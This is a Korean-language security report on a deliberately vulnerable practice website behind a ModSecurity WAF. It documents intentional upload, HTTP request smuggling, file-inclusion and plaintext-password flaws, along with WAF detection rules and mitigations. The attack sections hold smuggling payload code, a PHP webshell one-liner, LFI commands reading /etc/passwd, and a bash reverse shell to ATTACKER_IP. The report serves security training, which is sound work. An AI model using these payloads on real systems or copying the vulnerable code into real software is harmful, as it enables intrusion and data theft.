# 🔒 Website2 보안 분석 리포트

## 📋 목차
1. [보안 장치 (Security Features)](#보안-장치)
2. [취약점 (Vulnerabilities)](#취약점)
3. [공격 시나리오](#공격-시나리오)
4. [보안 테스트 결과](#보안-테스트-결과)

---

# 🛡️ 보안 장치 (Security Features)

## 1. ModSecurity WAF (Web Application Firewall)

### 📍 위치: Nginx (프론트엔드)

### ✅ 적용된 보안 규칙

#### 1.1 OWASP CRS (Core Rule Set)
- **버전**: 기본 CRS v3.x
- **Paranoia Level**: 1 (중간)
- **차단 모드**: On (SecRuleEngine On)

#### 1.2 커스텀 규칙 ([modsecurity_custom.conf](modsecurity_custom.conf))

| Rule ID | 설명 | 심각도 | 차단 대상 |
|---------|------|--------|----------|
| **999001** | PHP 코드 실행 함수 탐지 | CRITICAL | `system()`, `exec()`, `eval()` 등 |
| **999002** | PHP 슈퍼글로벌 변수 탐지 | WARNING | `$_GET`, `$_POST`, `$_REQUEST` |
| **999003** | 악성 파일명 탐지 | CRITICAL | shell, backdoor, webshell, cmd 등 |
| **999004** | PHP 파일 확장자 차단 | CRITICAL | `.php`, `.phtml`, `.php3-5` |
| **999005** | PHP 코드 내용 탐지 | CRITICAL | 업로드된 파일 내 PHP 코드 |
| **999006** | PHP 태그 탐지 | CRITICAL | `<?php`, `<?=` |
| **999007** | 파일 크기 제한 | WARNING | 5MB 초과 |
| **999008** | SQL Injection 탐지 | CRITICAL | SQLi 패턴 |
| **999009** | XSS 탐지 | WARNING | XSS 패턴 |
| **999010-11** | Rate Limiting | WARNING | 60초에 10번 초과 |

### 📊 WAF 동작 방식

```
클라이언트 요청
    ↓
┌─────────────────────────────────┐
│  ModSecurity WAF (Phase 1)       │
│  - Header 검사                   │
│  - Rate Limit 확인               │
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│  ModSecurity WAF (Phase 2)       │
│  - Body 파싱                     │
│  - 파일명 검사 (999003, 999004)  │
│  - 파일 내용 검사 (999001-006)   │
│  - SQL/XSS 검사 (999008-009)     │
└─────────────────────────────────┘
    ↓
  차단 or 통과
    ↓
  Nginx → Apache
```

### 🔍 WAF 로그

- **Audit Log**: `/var/log/modsec_audit.log`
- **Error Log**: `/var/log/nginx/error.log`
- **Access Log**: `/var/log/nginx/access.log`

---

## 2. Docker 네트워크 격리

### 📍 위치: Docker Compose

```yaml
networks:
  ota_network:
    driver: bridge
```

### ✅ 보안 효과

- **백엔드 격리**: Apache (web)는 외부에서 직접 접근 불가
- **포트 바인딩**: Nginx만 9000 포트로 외부 노출
- **내부 통신**: 컨테이너 간 통신은 내부 네트워크만 사용

```
외부 (호스트)
    │
    ├─ :9000 → Nginx WAF ✅ 접근 가능
    ├─ :3307 → MySQL     ✅ 접근 가능 (관리용)
    ├─ :8081 → phpMyAdmin ✅ 접근 가능 (관리용)
    │
    └─ :80 → Apache      ❌ 접근 불가 (내부 네트워크만)
```

---

## 3. Apache 기본 보안

### 📍 위치: Apache 2.4.65 (백엔드)

### ✅ 기본 보안 설정

- **TraceEnable Off**: HTTP TRACE 메소드 비활성화
- **ServerTokens Prod**: 서버 정보 최소화
- **LimitRequestFieldSize**: 헤더 크기 제한
- **Timeout 300**: 요청 타임아웃

---

# ⚠️ 취약점 (Vulnerabilities)

## 1. 🔴 Unrestricted File Upload (Critical)

### 📍 위치: `/api/submit_inquiry.php:56-106`

### 🐛 취약점 상세

```php
// WARNING: Weak validation for security testing purposes only
$original_name = basename($file['name']);
$file_info = pathinfo($original_name);
$filename_base = $file_info['filename'];
$file_ext = isset($file_info['extension']) ? $file_info['extension'] : '';

// ❌ 파일 확장자 검증 없음
// ❌ MIME 타입 검증 없음
// ❌ 매직 바이트 검증 없음

move_uploaded_file($file['tmp_name'], $target_path);
chmod($target_path, 0644); // 읽기 권한 부여
```

### 💥 영향

- **임의 파일 업로드**: PHP 웹쉘 업로드 가능
- **원격 코드 실행**: `system()`, `exec()` 등 실행 가능
- **리버스쉘**: 공격자 서버로 쉘 연결 가능

### 🎯 공격 방법

#### 방법 1: 일반 업로드 (WAF 없을 때)
```bash
curl -F "image=@shell.php" http://localhost:9000/api/submit_inquiry.php
```
→ **WAF 적용 시**: ❌ 차단됨 (Rule 999004)

#### 방법 2: Request Smuggling (WAF 우회)
```bash
python3 smuggle_webshell.py
```
→ **WAF 적용해도**: ✅ 우회 가능 (Nginx가 파싱 못함)

### 🛡️ 완화책

```php
// 허용된 확장자만
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
if (!in_array(strtolower($file_ext), $allowed_ext)) {
    throw new Exception('Invalid file type');
}

// MIME 타입 검증
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $file['tmp_name']);
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed_mime)) {
    throw new Exception('Invalid file content');
}
```

---

## 2. 🔴 HTTP Request Smuggling (Critical)

### 📍 위치: Nginx ↔ Apache 파싱 불일치

### 🐛 취약점 상세

#### CL.TE (Content-Length vs Transfer-Encoding)

**Nginx 파싱**:
```http
POST / HTTP/1.1
Content-Length: 687        ← Nginx는 이것 우선
Transfer-Encoding: chunked ← 무시됨
```

**Apache 파싱**:
```http
POST / HTTP/1.1
Content-Length: 687        ← 무시됨
Transfer-Encoding: chunked ← Apache는 이것 우선
```

### 💥 영향

- **WAF 우회**: Nginx WAF가 페이로드를 파싱하지 못함
- **보안 필터 무력화**: Rate Limit, 파일명 필터, 코드 패턴 탐지 모두 우회
- **로그 교란**: Nginx와 Apache 로그 불일치

### 🎯 공격 시나리오

```python
# Smuggling 페이로드
smuggled_request = b'POST /api/submit_inquiry.php HTTP/1.1\r\n...'

payload = (
    b'POST / HTTP/1.1\r\n'
    b'Content-Length: ' + str(len(smuggled_request)).encode() + b'\r\n'
    b'Transfer-Encoding: chunked\r\n'
    b'\r\n'
    b'0\r\n\r\n'  # Apache는 여기서 요청 종료
    + smuggled_request  # 이 부분은 버퍼에 저장됨
)
```

**결과**:
- Nginx: `POST /`만 보고 WAF 검사 안 함
- Apache: smuggled 요청을 다음에 처리 → 업로드 성공

### 🛡️ 완화책

```nginx
# Transfer-Encoding과 Content-Length 동시 존재 시 거부
if ($http_transfer_encoding != "") {
    return 400;
}

# 또는 Transfer-Encoding 헤더 제거
proxy_set_header Transfer-Encoding "";

# HTTP/2 강제 (Smuggling 불가)
listen 443 ssl http2;
```

---

## 3. 🟡 Local File Inclusion (Medium)

### 📍 위치: `/support.php:8-12`

### 🐛 취약점 상세

```php
$lang = isset($_GET['lang']) ? $_GET['lang'] : 'ko';
$page = isset($_GET['page']) ? $_GET['page'] : '';

if (!empty($page)) {
    $lang_file = "lang/{$lang}/{$page}";
    if (file_exists($lang_file)) {
        include($lang_file);  // ⚠️ 취약점
    }
}
```

### 💥 영향

- **임의 파일 읽기**: `../../../../etc/passwd` 가능
- **코드 실행**: 업로드된 파일을 include하여 실행

### 🎯 공격 예제

```bash
# /etc/passwd 읽기
curl "http://localhost:9000/support.php?lang=../../../../etc&page=passwd"

# 업로드한 웹쉘 실행
curl "http://localhost:9000/support.php?lang=../../uploads&page=shell.php"
```

### 🛡️ 완화책

```php
// 화이트리스트만 허용
$allowed_pages = ['common.php', 'menu.php', 'footer.php'];
if (!in_array($page, $allowed_pages)) {
    throw new Exception('Invalid page');
}

// 또는 경로 정규화
$page = basename($page); // 디렉토리 탐색 방지
```

---

## 4. 🟡 Plaintext Password Storage (Medium)

### 📍 위치: `/api/submit_inquiry.php:129`

### 🐛 취약점 상세

```php
if ($is_locked) {
    if (empty($data['password'])) {
        throw new Exception('Password is required for locked inquiries');
    }
    // WARNING: Plain text password storage for vulnerability testing
    $password = $data['password'];  // ⚠️ 평문 저장
}
```

### 💥 영향

- **DB 유출 시 비밀번호 노출**: 암호화 없음
- **관리자도 비밀번호 확인 가능**: 프라이버시 침해

### 🛡️ 완화책

```php
// bcrypt 해싱
$password = password_hash($data['password'], PASSWORD_BCRYPT);

// 검증 시
if (password_verify($input_password, $stored_password)) {
    // 인증 성공
}
```

---

## 5. 🟡 SQL Injection (Low - PDO로 완화됨)

### 📍 위치: `/api/get_inquiry_detail.php`

### ✅ 현재 상태: **안전** (Prepared Statement 사용)

```php
$stmt = $pdo->prepare("SELECT * FROM inquiries WHERE id = :id");
$stmt->execute([':id' => $id]);
```

### ⚠️ 주의사항

- PDO Prepared Statement로 SQLi 방어됨
- 하지만 동적 쿼리 생성 시 주의 필요

---

## 6. 🟢 XSS (Low - htmlspecialchars 사용)

### 📍 위치: 대부분의 PHP 파일

### ✅ 현재 상태: **비교적 안전**

```php
<h2><?php echo htmlspecialchars($lang); ?></h2>
```

### ⚠️ 주의사항

- 일부 출력에서 `htmlspecialchars` 누락 가능
- JavaScript 컨텍스트에서는 추가 인코딩 필요

---

# 🎯 공격 시나리오

## 시나리오 1: WAF 우회 → 웹쉘 업로드 → 리버스쉘

### Step 1: Request Smuggling으로 WAF 우회
```bash
python3 smuggle_webshell.py backdoor.php
```

### Step 2: 웹쉘 접근
```bash
curl "http://localhost:9000/uploads/backdoor.php?cmd=id"
```

### Step 3: 리버스쉘 획득
```bash
# 리스너 시작
nc -lvnp 4444

# 리버스쉘 트리거
curl "http://localhost:9000/uploads/backdoor.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

### 결과
- ✅ WAF 우회 성공
- ✅ 웹쉘 업로드 성공
- ✅ www-data 권한으로 쉘 획득

---

## 시나리오 2: LFI → 웹쉘 실행

### Step 1: 일반 업로드 (이미지로 위장)
```bash
echo '<?php system($_GET["c"]); ?>' > image.jpg.php
curl -F "image=@image.jpg.php" http://localhost:9000/api/submit_inquiry.php
```

### Step 2: LFI로 실행
```bash
curl "http://localhost:9000/support.php?lang=../../uploads&page=image.jpg.php&c=whoami"
```

### 결과
- ✅ 파일 업로드 (WAF가 .jpg 확장자를 허용할 수 있음)
- ✅ LFI로 PHP 코드 실행

---

# 📊 보안 테스트 결과

## 테스트 1: 일반 업로드 (WAF 적용 시)

### 시도
```bash
curl -F "image=@shell.php" http://localhost:9000/api/submit_inquiry.php
```

### 결과
```
HTTP/1.1 403 Forbidden
ModSecurity: Access denied with code 403 (phase 2).
Pattern match "\.php$" at FILES_NAMES.
[id "999004"] [msg "PHP File Upload Blocked"]
```

**평가**: ✅ WAF 정상 작동

---

## 테스트 2: Request Smuggling (WAF 우회)

### 시도
```bash
python3 smuggle_webshell.py
```

### 결과
```
[+] ✅ Webshell uploaded successfully!
[+] Webshell URL: http://localhost:9000/uploads/backdoor.php
[+] Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**평가**: ⚠️ WAF 우회 성공 (CL.TE 취약점)

---

## 테스트 3: Rate Limiting

### 시도
```bash
for i in {1..15}; do
  curl -X POST http://localhost:9000/api/submit_inquiry.php \
    -F "name=test" -F "email=test@test.com" \
    -F "phone=010-1234-5678" -F "category=technical" \
    -F "subject=test" -F "message=test"
  echo "Request $i"
done
```

### 결과
```
Request 1-10: 200 OK
Request 11-15: 403 Forbidden (Rate Limit Exceeded)
```

**평가**: ✅ Rate Limit 정상 작동 (60초에 10번 제한)

---

# 📋 보안 등급 요약

| 구분 | 등급 | 설명 |
|-----|------|------|
| **WAF 보호** | 🟢 양호 | ModSecurity + OWASP CRS |
| **파일 업로드 검증** | 🔴 취약 | 확장자/MIME 검증 없음 |
| **HTTP Smuggling** | 🔴 취약 | CL.TE 파싱 불일치 |
| **LFI 방어** | 🟡 보통 | 입력 검증 부족 |
| **SQLi 방어** | 🟢 양호 | Prepared Statement |
| **XSS 방어** | 🟢 양호 | htmlspecialchars 사용 |
| **비밀번호 보안** | 🟡 보통 | 평문 저장 |
| **네트워크 격리** | 🟢 양호 | Docker 네트워크 |
| **로깅** | 🟢 양호 | Nginx, Apache, ModSecurity |

**전체 보안 점수**: 🟡 **중간** (60/100)

---

# 🛡️ 보안 강화 권장사항

## 우선순위 1 (Critical)

1. **Request Smuggling 방어**
   ```nginx
   # Transfer-Encoding 차단
   if ($http_transfer_encoding != "") {
       return 400;
   }
   ```

2. **파일 업로드 검증 강화**
   ```php
   // 확장자, MIME, 매직 바이트 모두 검증
   ```

## 우선순위 2 (High)

3. **LFI 방어**
   ```php
   // 화이트리스트 + basename() 사용
   ```

4. **비밀번호 해싱**
   ```php
   password_hash($password, PASSWORD_BCRYPT);
   ```

## 우선순위 3 (Medium)

5. **HTTPS 적용** (SSL/TLS)
6. **CORS 정책** 설정
7. **CSP (Content Security Policy)** 헤더
8. **HSTS** 헤더 추가

---

**작성일**: 2025-10-20
**프로젝트**: website2 - HTTP Request Smuggling 실습 환경
**목적**: 교육 및 보안 테스트
